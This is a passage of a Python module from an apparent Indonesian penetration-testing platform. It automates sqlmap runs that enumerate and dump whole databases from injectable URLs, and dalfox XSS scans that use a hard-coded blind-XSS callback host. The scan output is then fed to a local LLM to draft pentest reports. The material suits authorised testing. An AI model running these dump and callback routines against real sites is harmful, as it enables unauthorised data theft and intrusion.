"""
Modul untuk Exploitation & Analysis
"""

# ====== IMPORTS ======
import os
import re
import time
import requests
from platform.utils.colors import Colors
from platform.utils.helpers import Helpers
import datetime
from platform.ollama_config import OLLAMA_API_URL, OLLAMA_MODEL_EXPLOIT

# ====== KELAS UTAMA ======
class ExploitationAnalysis:
    """Kelas untuk exploitation dan analysis"""
    
    def __init__(self):
        self.colors = Colors()
        self.helpers = Helpers()
        self.output_dir = self.helpers.output_dir

    def parse_sqlmap_databases(self, output):
        """Parse database dari output SQLMap"""
        dbs = []
        for line in output.split('\n'):
            line = line.strip()
            # Cari baris yang mengandung [*] dan nama database
            if line.startswith('[*]') and not 'available databases' in line:
                # Extract database name dari format [*] acuart
                db_name = line[4:].strip()  # Hapus [*] dan spasi
                # Filter hanya nama database yang valid (tidak mengandung timestamp atau kata kunci lain)
                if (db_name and 
                    not db_name.startswith(('starting', 'ending', 'fetched', 'INFO')) and
                    not any(x in db_name for x in ['/', ':']) and
                    len(db_name) > 0 and
                    db_name.replace('_', '').isalnum()):  # Terima underscore dalam nama database
                    dbs.append(db_name)
        return dbs

    def analyze_with_llm_and_save(self, content, vuln_type, domain, auto_push=False):
        """Menganalisis hasil eksploitasi dengan LLM dan menyimpan ke file dengan timestamp"""
        print(f"\n{self.colors.BLUE}=== Analisis Otomatis dengan LLM ==={self.colors.NC}")
        print(f"{self.colors.YELLOW}Menganalisis hasil {vuln_type} untuk domain: {domain}{self.colors.NC}")
        
        try:
            # Import VulnerabilityScanner
            from platform.modules.vulnerability import VulnerabilityScanner
            vuln_scanner = VulnerabilityScanner()
            
            # Buat prompt khusus berdasarkan jenis vulnerability
            if vuln_type == 'sqlmap':
                prompt = f"""
                Anda adalah seorang analis keamanan siber senior yang mengkhususkan diri dalam SQL Injection.
                
                Analisis hasil SQLMap berikut untuk domain {domain}:
                ---
                {content}
                ---
                
                Berikan analisis dalam format berikut:
                1. **Ringkasan Eksploitasi**: Jelaskan apa yang berhasil dieksploitasi
                2. **Database yang Ditemukan**: Daftar database yang berhasil diakses
                3. **Tabel yang Dump**: Data apa yang berhasil diekstrak
                4. **Tingkat Keparahan**: Evaluasi tingkat keparahan (Kritis/Tinggi/Sedang/Rendah)
                5. **Rekomendasi Perbaikan**: Langkah-langkah spesifik untuk memperbaiki kerentanan
                6. **Dampak Bisnis**: Potensi kerugian yang dapat terjadi
                7. **Timeline Perbaikan**: Prioritas dan timeline perbaikan
                """
            elif vuln_type == 'dalfox':
                prompt = f"""
                Anda adalah seorang analis keamanan siber senior yang mengkhususkan diri dalam Cross-Site Scripting (XSS).
                
                Analisis hasil Dalfox berikut untuk domain {domain}:
                ---
                {content}
                ---
                
                Berikan analisis dalam format berikut:
                1. **Ringkasan Eksploitasi**: Jelaskan XSS yang berhasil ditemukan
                2. **Parameter Rentan**: Parameter mana yang rentan terhadap XSS
                3. **Payload yang Berhasil**: Payload XSS yang berhasil dieksekusi
                4. **Tingkat Keparahan**: Evaluasi tingkat keparahan (Kritis/Tinggi/Sedang/Rendah)
                5. **Rekomendasi Perbaikan**: Langkah-langkah spesifik untuk mencegah XSS
                6. **Dampak Bisnis**: Potensi kerugian yang dapat terjadi
                7. **Timeline Perbaikan**: Prioritas dan timeline perbaikan
                """

            else:
                prompt = f"""
                Anda adalah seorang analis keamanan siber senior.
                
                Analisis hasil eksploitasi berikut untuk domain {domain}:
                ---
                {content}
                ---
                
                Berikan analisis dalam format berikut:
                1. **Ringkasan Temuan**: Jelaskan kerentanan yang ditemukan
                2. **Tingkat Keparahan**: Evaluasi tingkat keparahan (Kritis/Tinggi/Sedang/Rendah)
                3. **Rekomendasi Perbaikan**: Langkah-langkah spesifik untuk memperbaiki kerentanan
                4. **Dampak Bisnis**: Potensi kerugian yang dapat terjadi
                5. **Timeline Perbaikan**: Prioritas dan timeline perbaikan
                """
            
            # Panggil LLM API
            payload = {
                "model": OLLAMA_MODEL_EXPLOIT,
                "prompt": prompt,
                "stream": False
            }
            
            response = requests.post(OLLAMA_API_URL, json=payload, timeout=300)
            response.raise_for_status()
            
            full_response = response.json()
            analysis_text = full_response.get('response', 'Tidak ada respons dari model.')
            
            # Buat timestamp untuk nama file
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"llm_{vuln_type}_{timestamp}.txt"
            
            # Simpan ke direktori output domain
            domain_output_dir = self.helpers.get_domain_output_dir(domain)
            os.makedirs(domain_output_dir, exist_ok=True)
            file_path = os.path.join(domain_output_dir, filename)
            
            # Tulis hasil analisis ke file
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(f"=== Analisis LLM {vuln_type.upper()} ===\n")
                f.write(f"Domain: {domain}\n")
                f.write(f"Timestamp: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Jenis Analisis: {vuln_type}\n")
                f.write("=" * 50 + "\n\n")
                f.write("HASIL ANALISIS LLM:\n")
                f.write("-" * 30 + "\n")
                f.write(analysis_text)
                f.write("\n\n" + "=" * 50 + "\n")
                f.write("RAW OUTPUT TOOL:\n")
                f.write("-" * 20 + "\n")
                f.write(content)
            
            print(f"{self.colors.GREEN}[+] Analisis LLM berhasil disimpan ke: {file_path}{self.colors.NC}")
            print(f"{self.colors.BLUE}[*] File ini dapat digunakan untuk generate report PDF{self.colors.NC}")
            
            return file_path
            
        except Exception as e:
            print(f"{self.colors.RED}[!] Gagal menganalisis dengan LLM: {str(e)}{self.colors.NC}")
            print(f"{self.colors.YELLOW}[!] Pastikan Ollama berjalan dan dapat diakses{self.colors.NC}")
            return None

    def auto_push_to_reporting(self, domain, llm_file, vuln_type):
        """Otomatis push hasil analisis LLM ke reporting"""
        print(f"\n{self.colors.BLUE}=== Auto-Push ke Reporting ==={self.colors.NC}")
        print(f"{self.colors.YELLOW}Mempersiapkan report untuk {vuln_type}...{self.colors.NC}")
        
        try:
            # Import modul reporting
            from platform.modules.reporting import Reporting
            reporting = Reporting()
            
            # Cari semua file LLM untuk domain ini
            domain_output_dir = self.helpers.get_domain_output_dir(domain)
            llm_files = []
            
            if os.path.exists(domain_output_dir):
                for file in os.listdir(domain_output_dir):
                    if file.startswith('llm_') and file.endswith('.txt'):
                        llm_files.append(os.path.join(domain_output_dir, file))
            
            if not llm_files:
                print(f"{self.colors.YELLOW}[!] Tidak ada file LLM yang ditemukan untuk reporting{self.colors.NC}")
                return
            
            print(f"{self.colors.GREEN}[+] Ditemukan {len(llm_files)} file analisis LLM:{self.colors.NC}")
            for file in llm_files:
                print(f"  - {os.path.basename(file)}")
            
            # Tanya user apakah ingin langsung generate PDF
            print(f"\n{self.colors.YELLOW}Apakah ingin langsung generate PDF report? (y/n):{self.colors.NC}", end=" ")
            choice = input().strip().lower()
            
            if choice == 'y':
                print(f"{self.colors.BLUE}Memulai generate PDF report...{self.colors.NC}")
                
                # Buat informasi report otomatis
                report_info = {
                    'report_title': f"Laporan Pentest - {domain}",
                    'target_domain': domain,
                    'researcher_name': "Penedge Team",
                    'report_date': datetime.datetime.now().strftime("%d %B %Y"),
                    'report_version': "1.0",
                    'current_year': datetime.datetime.now().year
                }
                
                # Parse file LLM sebagai tool outputs
                tool_outputs = []
                for file_path in llm_files:
                    try:
                        with open(file_path, 'r', encoding='utf-8') as f:
                            content = f.read()
                        
                        # Extract nama tool dari nama file
                        filename = os.path.basename(file_path)
                        tool_name = filename.replace('llm_', '').replace('.txt', '').upper()
                        
                        tool_outputs.append({
                            'tool_name': f"LLM Analysis - {tool_name}",
                            'content': content,
                            'file_path': file_path,
                            'original_content': content
                        })
                    except Exception as e:
                        print(f"{self.colors.YELLOW}[!] Gagal membaca file {file_path}: {str(e)}{self.colors.NC}")
                
                if tool_outputs:
                    # Generate HTML content
                    html_content = reporting._generate_html_content(report_info, tool_outputs)
                    
                    if html_content:
                        # Convert to PDF
                        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                        pdf_filename = f"pentest_report_{domain}_{timestamp}.pdf"
                        pdf_path = os.path.join(domain_output_dir, pdf_filename)
                        
                        try:
                            from weasyprint import HTML
                            HTML(string=html_content).write_pdf(pdf_path)
                            print(f"{self.colors.GREEN}[+] Report PDF berhasil dibuat: {pdf_path}{self.colors.NC}")
                            print(f"{self.colors.BLUE}[*] Report siap untuk didistribusikan{self.colors.NC}")
                        except Exception as e:
                            print(f"{self.colors.RED}[!] Gagal membuat PDF: {str(e)}{self.colors.NC}")
                            print(f"{self.colors.YELLOW}[!] Pastikan WeasyPrint terinstal: pip install weasyprint{self.colors.NC}")
                    else:
                        print(f"{self.colors.RED}[!] Gagal generate HTML content{self.colors.NC}")
                else:
                    print(f"{self.colors.RED}[!] Tidak ada data yang valid untuk reporting{self.colors.NC}")
            else:
                print(f"{self.colors.BLUE}[*] File analisis LLM siap untuk reporting manual{self.colors.NC}")
                print(f"{self.colors.YELLOW}[*] Gunakan menu 'Reporting' untuk generate PDF nanti{self.colors.NC}")
                
        except Exception as e:
            print(f"{self.colors.RED}[!] Gagal auto-push ke reporting: {str(e)}{self.colors.NC}")

    def parse_sqlmap_tables(self, output, db_name):
        """Parse tabel dari output SQLMap dengan filter nama tabel yang valid"""
        tables = []
        for line in output.split('\n'):
            line = line.strip()
            if line.startswith('|') and line.endswith('|'):
                table_name = line[1:-1].strip()
                # Hanya terima nama tabel yang terdiri dari huruf, angka, dan underscore saja
                if re.fullmatch(r'[a-zA-Z0-9_]+', table_name):
                    tables.append(table_name)
        return tables

    def run_exploitation_analysis_menu(self):
        """Menu utama exploitation & analysis"""
        while True:
            print(f"\n{self.colors.BLUE}--- Exploitation & Analysis (Eksplorasi Kerentanan) ---{self.colors.NC}")
            print("ðŸŽ¯ Tujuan:")
            print("Mengidentifikasi detail informasi aktif dari target melalui interaksi langsung. Fokus pada eksplorasi kerentanan SQL Injection, XSS, Redirect, dan LFI.")
            print(f"\nðŸ“Œ Contoh Aktivitas:")
            print("- Menemukan parameter rentan SQLi dengan sqlmap.")
            print("- Mendeteksi XSS dengan dalfox.")
            print("- Membuktikan redirect dan lfi dengan ffuf.")

            print(f"\nðŸ›  Tools:")
            print("1. sqlmap (SQL Injection)")
            print("2. dalfox (XSS)")
            print("3. redirect (Open Redirect)")
            print("4. lfi (Local File Inclusion)")
            print("5. Kembali ke Menu Tools Pentest")
            print("Pilih tool (1-5): ", end="")
            choice = input().strip()
            if choice == "1":
                self.sqlmap_menu()
            elif choice == "2":
                self.dalfox_menu()
            elif choice == "3":
                self.redirect_ffuf_menu()
            elif choice == "4":
                self.lfi_ffuf_menu()
            elif choice == "5":
                return
            else:
                print(f"{self.colors.RED}[!] Pilihan tidak valid{self.colors.NC}")

    def sqlmap_menu(self):
        """Menu SQLMap dengan mode otomatis dan manual"""
        while True:
            print(f"\n{self.colors.GREEN}=== SQLMAP (SQL Injection) ==={self.colors.NC}")
            print("Pilih operasi yang ingin dilakukan:")
            print("1. Mode Otomatis (Cek, Pilih DB, Pilih Tabel, Dump)")
            print("2. Mode Manual (Ketik Perintah Sendiri)")
            print("3. Kembali ke Menu Sebelumnya")
            print("Pilih operasi (1-3): ", end="")
            choice = input().strip()
            if choice == "1":
                self.sqlmap_auto_mode()
            elif choice == "2":
                self.sqlmap_manual_mode()
            elif choice == "3":
                break
            else:
                print(f"{self.colors.RED}[!] Pilihan tidak valid{self.colors.NC}")
            input(f"\n{self.colors.GREEN}Tekan Enter untuk melanjutkan...{self.colors.NC}")

    def run(self, domain=None, auto_continue=False):
        if domain is None:
            self.run_exploitation_analysis_menu()
        else:
            print(f"{self.colors.BLUE}=== [Exploit & Analysis Otomatis] ==={self.colors.NC}")
            # Jalankan sqlmap_auto_mode otomatis untuk domain
            # (Bisa dikembangkan untuk dalfox juga jika ingin otomatis)
            self.sqlmap_auto_mode(domain, auto_continue=auto_continue)

    def sqlmap_auto_mode(self, domain=None, auto_continue=False):
        """Mode otomatis SQLMap - langsung gunakan file sql_candidates_gf.txt dari output/<domain>"""
        if domain is None:
            while True:
                print(f"\n{self.colors.YELLOW}Masukkan domain target (contoh: poltekssn.ac.id, ketik 'q' untuk kembali):{self.colors.NC}", end=" ")
                domain = input().strip()
                if domain.lower() == 'q':
                    return
                if not self.helpers.is_valid_domain(domain):
                    print(f"{self.colors.RED}Domain tidak valid! Contoh: poltekssn.ac.id, example.com{self.colors.NC}")
                    continue
                break
            
        # Gunakan Normal Scan sebagai default (Level 3, Risk 2)
        level, risk = 3, 2
        print(f"{self.colors.GREEN}[+] Mode: Normal Scan (Level {level}, Risk {risk}) - Seimbang antara kecepatan dan kedalaman{self.colors.NC}")
        
        # Cari file hasil sorting GF dari tahap footprinting
        gf_out = self.helpers.get_gf_candidates_path('sql', domain)
        if not os.path.exists(gf_out) or os.path.getsize(gf_out) == 0:
            print(f"{self.colors.RED}File kandidat SQLi hasil GF tidak ditemukan di: {gf_out}{self.colors.NC}")
            print(f"{self.colors.YELLOW}Pastikan sudah menjalankan footprinting dan file sql_candidates_gf.txt sudah ada.{self.colors.NC}")
            return
        print(f"{self.colors.GREEN}Endpoint kandidat SQLi diambil dari: {gf_out}{self.colors.NC}")
        
        # 3. SQLMap scan satu per satu (dengan progress)
        if not self.helpers.check_command_exists("sqlmap"):
            print(f"{self.colors.RED}[!] sqlmap tidak ditemukan. Pastikan sudah terinstal.{self.colors.NC}")
            return
        output_file = self.helpers.get_scan_output_path('sqlmap', domain)
        with open(gf_out) as f:
            urls = [line.strip() for line in f if line.strip()]
        # Exclude pattern tertentu
        def should_exclude_url(url):
            exclude_patterns = [
                '/bxss/vuln.php',
            ]
            return any(pattern in url for pattern in exclude_patterns)
        urls = [url for url in urls if not should_exclude_url(url)]
        print(f"{self.colors.BLUE}Menjalankan sqlmap satu per satu pada {len(urls)} endpoint hasil filter...{self.colors.NC}")
        found_and_dumped = False
        for idx, url in enumerate(urls, 1):
            print(f"\n{self.colors.YELLOW}=== [ {idx} / {len(urls)} ] Proses enumerasi untuk: {url} ==={self.colors.NC}")
            print(f"{self.colors.BLUE}Menampilkan database dengan sqlmap...{self.colors.NC}")
            sqlmap_cmd = f"sqlmap -u '{url}' --batch --level=3 --risk=2 --timeout=5 --retries=1 --threads=5 --technique=EU --smart --tamper=space2comment --random-agent --dbs"
            self.helpers.run_command_realtime(sqlmap_cmd)
            # Setelah selesai, capture hasil untuk parsing dan interaksi
            result = self.helpers.run_command_capture(sqlmap_cmd)
            filtered_lines = []
            for line in result.splitlines():
                if "[INFO] current status:" in line:
                    continue
                filtered_lines.append(line)
            with open(output_file, 'a') as f:
                f.write(f"=== SQLMAP DBS (Level {level}, Risk {risk}) [{url}] ===\n")
                f.write('\n'.join(filtered_lines) + "\n")
            dbs = self.parse_sqlmap_databases(result)
            if not dbs:
                print(f"{self.colors.RED}Tidak ditemukan database pada target ini.{self.colors.NC}")
                print(f"{self.colors.YELLOW}Pastikan target rentan terhadap SQL Injection.{self.colors.NC}")
                continue
            print(f"\n{self.colors.GREEN}Database yang ditemukan:{self.colors.NC}")
            for i, db in enumerate(dbs, 1):
                print(f"{i}. {db}")
            # Pilih database
            while True:
                try:
                    choice = int(input("Pilih nomor database: ")) - 1
                    if 0 <= choice < len(dbs):
                        db_name = dbs[choice]
                        break
                    else:
                        print(f"{self.colors.RED}Pilihan tidak valid.{self.colors.NC}")
                except ValueError:
                    print(f"{self.colors.RED}Masukkan angka yang valid.{self.colors.NC}")
            # 2. Tampilkan tabel
            print(f"\n{self.colors.GREEN}Menampilkan tabel pada database '{db_name}'...{self.colors.NC}")
            # Kembalikan parameter sqlmap ke default semula
            sqlmap_cmd = f"sqlmap -u '{url}' --batch --level=3 --risk=2 --timeout=5 --retries=1 --threads=5 --technique=EU --smart --tamper=space2comment --random-agent -D '{db_name}' --tables"
            self.helpers.run_command_realtime(sqlmap_cmd)
            result = self.helpers.run_command_capture(sqlmap_cmd)
            filtered_lines = []
            for line in result.splitlines():
                if "[INFO] current status:" in line:
                    continue
                filtered_lines.append(line)
            with open(output_file, 'a') as f:
                f.write(f"=== SQLMAP TABLES ({db_name}) (Level {level}, Risk {risk}) [{url}] ===\n")
                f.write('\n'.join(filtered_lines) + "\n")
            tables = self.parse_sqlmap_tables(result, db_name)
            if not tables:
                print(f"{self.colors.RED}Tidak ditemukan tabel pada database ini.{self.colors.NC}")
                print(f"{self.colors.YELLOW}Pastikan database '{db_name}' memiliki tabel.{self.colors.NC}")
                continue
            print(f"\n{self.colors.GREEN}Tabel yang ditemukan di database '{db_name}':{self.colors.NC}")
            for i, table in enumerate(tables, 1):
                print(f"{i}. {table}")
            # Opsi untuk memilih tabel
            while True:
                print(f"\n{self.colors.YELLOW}Pilih opsi:{self.colors.NC}")
                print("1. Pilih tabel untuk dump (bisa satu atau lebih)")
                print("2. Dump semua tabel")
                print("3. Kembali ke menu sebelumnya")
                print("Pilih opsi (1-3): ", end="")
                table_choice = input().strip().lower()
                if table_choice == "1":
                    # Pilih satu atau beberapa tabel
                    while True:
                        print(f"{self.colors.YELLOW}Pilih nomor tabel (pisahkan dengan koma jika lebih dari satu, contoh: 1,3,5):{self.colors.NC}", end=" ")
                        table_choices = input().strip().lower()
                        if table_choices == 'q':
                            break
                        try:
                            choices = [int(x.strip()) - 1 for x in table_choices.split(',')]
                            selected_tables = []
                            for choice in choices:
                                if 0 <= choice < len(tables):
                                    selected_tables.append(tables[choice])
                                else:
                                    print(f"{self.colors.RED}Nomor {choice + 1} tidak valid, dilewati.{self.colors.NC}")
                            if selected_tables:
                                print(f"{self.colors.BLUE}Menjalankan dump untuk tabel: {', '.join(selected_tables)}{self.colors.NC}")
                                for table_name in selected_tables:
                                    print(f"{self.colors.GREEN}Dumping tabel: {table_name}{self.colors.NC}")
                                    # Kembalikan parameter sqlmap ke default semula
                                    sqlmap_cmd = f"sqlmap -u '{url}' --batch --level=3 --risk=2 --timeout=5 --retries=1 --threads=5 --technique=EU --smart --tamper=space2comment --random-agent -D '{db_name}' -T '{table_name}' --dump"
                                    self.helpers.run_command_realtime(sqlmap_cmd)
                                    result = self.helpers.run_command_capture(sqlmap_cmd)
                                    filtered_lines = []
                                    for line in result.splitlines():
                                        if "[INFO] current status:" in line:
                                            continue
                                        filtered_lines.append(line)
                                    with open(output_file, 'a') as f:
                                        f.write(f"=== SQLMAP DUMP ({db_name}.{table_name}) (Level {level}, Risk {risk}) [{url}] ===\n")
                                        f.write('\n'.join(filtered_lines) + "\n")
                                    print(f"{self.colors.YELLOW}{'='*50}{self.colors.NC}")
                                print(f"{self.colors.GREEN}Proses dump tabel selesai.{self.colors.NC}")
                                found_and_dumped = True
                                
                                # Analisis otomatis dengan LLM jika ditemukan kerentanan
                                if found_and_dumped:
                                    print(f"\n{self.colors.BLUE}=== Memulai Analisis Otomatis dengan LLM ==={self.colors.NC}")
                                    # Baca hasil SQLMap yang baru saja dibuat
                                    with open(output_file, 'r', encoding='utf-8') as f:
                                        sqlmap_content = f.read()
                                    
                                    # Analisis dengan LLM
                                    llm_file = self.analyze_with_llm_and_save(sqlmap_content, 'sqlmap', domain, auto_push=auto_continue)
                                    if llm_file:
                                        print(f"{self.colors.GREEN}[+] File analisis LLM tersedia untuk reporting: {llm_file}{self.colors.NC}")
                                        if auto_continue:
                                            self.auto_push_to_reporting(domain, llm_file, 'SQL Injection')
                            else:
                                print(f"{self.colors.RED}Tidak ada tabel yang dipilih.{self.colors.NC}")
                            break
                        except ValueError:
                            print(f"{self.colors.RED}Format input tidak valid. Gunakan angka yang dipisahkan koma.{self.colors.NC}")
                    break
                elif table_choice == "2":
                    # Dump semua tabel
                    print(f"{self.colors.BLUE}Menjalankan dump untuk semua tabel...{self.colors.NC}")
                    for table_name in tables:
                        print(f"{self.colors.GREEN}Dumping tabel: {table_name}{self.colors.NC}")
                        # Kembalikan parameter sqlmap ke default semula
                        sqlmap_cmd = f"sqlmap -u '{url}' --batch --level=3 --risk=2 --timeout=5 --retries=1 --threads=5 --technique=EU --smart --tamper=space2comment --random-agent -D '{db_name}' -T '{table_name}' --dump"
                        self.helpers.run_command_realtime(sqlmap_cmd)
                        result = self.helpers.run_command_capture(sqlmap_cmd)
                        filtered_lines = []
                        for line in result.splitlines():
                            if "[INFO] current status:" in line:
                                continue
                            filtered_lines.append(line)
                        with open(output_file, 'a') as f:
                            f.write(f"=== SQLMAP DUMP ({db_name}.{table_name}) (Level {level}, Risk {risk}) [{url}] ===\n")
                            f.write('\n'.join(filtered_lines) + "\n")
                        print(f"{self.colors.YELLOW}{'='*50}{self.colors.NC}")
                    print(f"{self.colors.GREEN}Proses dump semua tabel selesai.{self.colors.NC}")
                    found_and_dumped = True
                    
                    # Analisis otomatis dengan LLM jika ditemukan kerentanan
                    if found_and_dumped:
                        print(f"\n{self.colors.BLUE}=== Memulai Analisis Otomatis dengan LLM ==={self.colors.NC}")
                        # Baca hasil SQLMap yang baru saja dibuat
                        with open(output_file, 'r', encoding='utf-8') as f:
                            sqlmap_content = f.read()
                        
                        # Analisis dengan LLM
                        llm_file = self.analyze_with_llm_and_save(sqlmap_content, 'sqlmap', domain, auto_push=auto_continue)
                        if llm_file:
                            print(f"{self.colors.GREEN}[+] File analisis LLM tersedia untuk reporting: {llm_file}{self.colors.NC}")
                            if auto_continue:
                                self.auto_push_to_reporting(domain, llm_file, 'SQL Injection')
                    break
                elif table_choice == "3" or table_choice == "q":
                    break
                else:
                    print(f"{self.colors.RED}Pilihan tidak valid.{self.colors.NC}")
            # Setelah proses dump, kontrol lanjut ke URL berikutnya
            if not auto_continue:
                print(f"\n{self.colors.YELLOW}Apakah Anda ingin melanjutkan ke URL berikutnya? (y/n):{self.colors.NC}", end=" ")
                lanjut = input().strip().lower()
                if lanjut != 'y':
                    print(f"{self.colors.GREEN}Proses sqlmap dihentikan oleh user.{self.colors.NC}")
                    break
        # Setelah loop SQLi selesai:
        if auto_continue:
            # Mode pipeline: lanjut otomatis ke XSS dan analisis
            print(f"{self.colors.BLUE}=== Melanjutkan ke tahap XSS Otomatis ==={self.colors.NC}")
            self.dalfox_auto_mode()
            print(f"{self.colors.BLUE}=== Melanjutkan ke tahap Analisis Kerentanan Otomatis ==={self.colors.NC}")
            from platform.modules.vulnerability import VulnerabilityScanner
            vuln = VulnerabilityScanner()
            vuln.run_vulnerability_menu()
        else:
            # Mode manual: tampilkan menu pilihan ke user
            while True:
                print(f"\n{self.colors.YELLOW}Tahap SQL Injection selesai. Pilih langkah selanjutnya:{self.colors.NC}")
                print("1. Lanjut scan XSS")
                print("2. Analisis temuan (Vulnerability Analysis)")
                print("3. Kembali ke menu utama")
                pilihan = input("Pilihan Anda: ").strip()
                if pilihan == '1':
                    self.dalfox_menu()
                    break
                elif pilihan == '2':
                    from platform.modules.vulnerability import VulnerabilityScanner
                    vuln = VulnerabilityScanner()
                    vuln.run_vulnerability_menu()
                    break
                elif pilihan == '3':
                    break
                else:
                    print(f"{self.colors.RED}Pilihan tidak valid.{self.colors.NC}")

    def sqlmap_manual_mode(self):
        """Mode manual SQLMap"""
        print(f"\n{self.colors.GREEN}=== Mode Manual SQLMap ==={self.colors.NC}")
        print("sqlmap adalah tool otomatis untuk mendeteksi dan mengeksploitasi kerentanan SQL Injection pada aplikasi web.")
        print(f"\nContoh penggunaan:")
        print("  sqlmap -u 'http://target.com/page.php?id=1' --batch --risk=3 --level=5")
        print(f"\nPenjelasan parameter:")
        print("  -u         : URL target yang ingin diuji.")
        print("  --batch    : Menjawab otomatis semua prompt (non-interaktif).")
        print("  --risk     : Level risiko pengujian (1-3, default 1). Semakin tinggi, semakin agresif.")
        print("  --level    : Level pengujian (1-5, default 1). Semakin tinggi, semakin banyak payload yang dicoba.")
        print("  --dbs      : Menampilkan daftar database jika target rentan.")
        print("  --tables   : Menampilkan tabel pada database tertentu.")
        print("  --dump     : Dump data dari tabel.")
        print(f"\nCatatan: Pastikan url target rentan dan gunakan dengan izin!")
        print(f"\n{self.colors.YELLOW}Masukkan perintah sqlmap yang ingin dijalankan (atau tekan Enter untuk kembali):{self.colors.NC}", end=" ")
        
        user_cmd = input().strip()
        if user_cmd:
            print(f"{self.colors.BLUE}Menjalankan: {user_cmd}{self.colors.NC}")
            self.helpers.run_command_realtime(user_cmd)

    def dalfox_menu(self):
        """Menu Dalfox dengan tahapan paramspider dan scan XSS"""
        while True:
            print(f"\n{self.colors.GREEN}=== DALFOX (XSS) ==={self.colors.NC}")
            print("Pilih operasi yang ingin dilakukan:")
            print("1. Mode Otomatis (Cari Parameter & Scan XSS)")
            print("2. Mode Manual (Ketik Perintah Sendiri)")
            print("3. Kembali ke Menu Sebelumnya")
            print("Pilih operasi (1-3): ", end="")
            
            choice = input().strip()
            
            if choice == "1":
                self.dalfox_auto_mode()
            elif choice == "2":
                self.dalfox_manual_mode()
            elif choice == "3":
                break
            else:
                print(f"{self.colors.RED}[!] Pilihan tidak valid{self.colors.NC}")
            
            input(f"\n{self.colors.GREEN}Tekan Enter untuk melanjutkan...{self.colors.NC}")

    def dalfox_auto_mode(self):
        """Mode otomatis Dalfox: langsung gunakan file xss_candidates_gf.txt dari output/<domain>"""
        while True:
            print(f"\n{self.colors.YELLOW}Masukkan domain target (contoh: poltekssn.ac.id, ketik 'q' untuk kembali):{self.colors.NC}", end=" ")
            domain = input().strip()
            if domain.lower() == 'q':
                return
            if not self.helpers.is_valid_domain(domain):
                print(f"{self.colors.RED}Domain tidak valid! Contoh: poltekssn.ac.id, example.com{self.colors.NC}")
                continue
            break
        # Cari file hasil sorting GF dari tahap footprinting
        gf_out = self.helpers.get_gf_candidates_path('xss', domain)
        if not os.path.exists(gf_out) or os.path.getsize(gf_out) == 0:
            print(f"{self.colors.RED}File kandidat XSS hasil GF tidak ditemukan di: {gf_out}{self.colors.NC}")
            print(f"{self.colors.YELLOW}Pastikan sudah menjalankan footprinting dan file xss_candidates_gf.txt sudah ada.{self.colors.NC}")
            return
        print(f"{self.colors.GREEN}Endpoint kandidat XSS diambil dari: {gf_out}{self.colors.NC}")
        # Otomatis penamaan file output
        output_dir = self.helpers.get_domain_output_dir(domain)
        dalfox_out = self.helpers.get_scan_output_path('dalfox', domain)
        print(f"{self.colors.BLUE}Output akan disimpan di: {dalfox_out}{self.colors.NC}")
        # Tidak ada input blind xss callback, langsung otomatis
        blind = 'hawhul.xss.ht'
        # 3. Dalfox scan satu per satu
        with open(gf_out) as f:
            urls = [line.strip() for line in f if line.strip()]
        print(f"{self.colors.BLUE}Menjalankan dalfox satu per satu pada {len(urls)} endpoint hasil filter...{self.colors.NC}")
        batch_results = []
        for idx, url in enumerate(urls, 1):
            print(f"\n{self.colors.YELLOW}=== [ {idx} / {len(urls)} ] Proses scan Dalfox untuk: {url} ==={self.colors.NC}")
            dalfox_cmd = f"dalfox url '{url}' --no-color -b {blind}"
            # Jalankan Dalfox dan capture hasil
            result = self.helpers.run_command_capture(dalfox_cmd)
            # Simpan hasil ke batch (jika tidak kosong)
            if result.strip():
                batch_results.append(f"=== Dalfox Result for: {url} ===\n{result}\n")

            # Tanya ke user dulu sebelum analisis LLM
            print(f"\n{self.colors.YELLOW}Apakah Anda ingin melanjutkan ke URL berikutnya? (y/n):{self.colors.NC}", end=" ")
            lanjut = input().strip().lower()
            if lanjut == 'y':
                continue
            else:
                # Simpan seluruh batch ke file output
                if batch_results:
                    with open(dalfox_out, 'w') as f:
                        f.write('\n'.join(batch_results))
                    print(f"{self.colors.GREEN}Hasil Dalfox untuk batch ini disimpan di: {dalfox_out}{self.colors.NC}")
                else:
                    print(f"{self.colors.YELLOW}Tidak ada hasil Dalfox yang disimpan karena tidak ada hasil valid.{self.colors.NC}")
                print(f"\n{self.colors.BLUE}=== Memulai Analisis Otomatis dengan LLM ==={self.colors.NC}")
                llm_file = self.analyze_with_llm_and_save('\n'.join(batch_results), 'dalfox', domain, auto_push=False)
                if llm_file:
                    print(f"{self.colors.GREEN}[+] File analisis LLM tersedia untuk reporting: {llm_file}{self.colors.NC}")
                print(f"{self.colors.GREEN}Proses Dalfox dihentikan oleh user.{self.colors.NC}")
                break

    def dalfox_manual_mode(self):
        """Mode manual Dalfox"""
        print(f"\n{self.colors.GREEN}=== Mode Manual Dalfox ==={self.colors.NC}")
        print("dalfox adalah tool otomatis untuk mendeteksi dan mengeksploitasi kerentanan XSS (Cross Site Scripting).")
        print(f"\nContoh penggunaan:")
        print("  dalfox url 'http://target.com/page.php?q=tes' --no-color")
        print(f"\nPenjelasan parameter:")
        print("  url        : URL target yang ingin diuji.")
        print("  file       : File berisi daftar URL untuk diuji.")
        print("  --no-color : Output tanpa warna (opsional).")
        print("  --cookie   : Menyisipkan cookie jika butuh autentikasi.")
        print(f"\nCatatan: Gunakan pada parameter yang dicurigai rentan XSS.")
        print(f"\n{self.colors.YELLOW}Masukkan perintah dalfox yang ingin dijalankan (atau tekan Enter untuk kembali):{self.colors.NC}", end=" ")
        
        user_cmd = input().strip()
        if user_cmd:
            print(f"{self.colors.BLUE}Menjalankan: {user_cmd}{self.colors.NC}")
            result = self.helpers.run_command_realtime_and_capture(user_cmd)
            
            if result:
                # Tanya untuk analisis LLM
                print(f"\n{self.colors.YELLOW}Apakah Anda ingin menganalisis hasil Dalfox ini dengan LLM? (y/n):{self.colors.NC}", end=" ")
                analyze_choice = input().strip().lower()
                if analyze_choice == 'y':
                    # TODO: Implement LLM analysis
                    print(f"{self.colors.BLUE}[*] Fitur analisis LLM akan diimplementasikan nanti{self.colors.NC}")
                
                # Ambil hasil XSS yang valid
                xss_results = []
                for line in result.split('\n'):
                    if any(keyword in line for keyword in ['[POC]', '[VULN]', '<script', '[GREP]']):
                        if not any(exclude in line for exclude in ['INFO', 'star', 'dalfox']):
                            xss_results.append(line.strip())
                
                if xss_results:
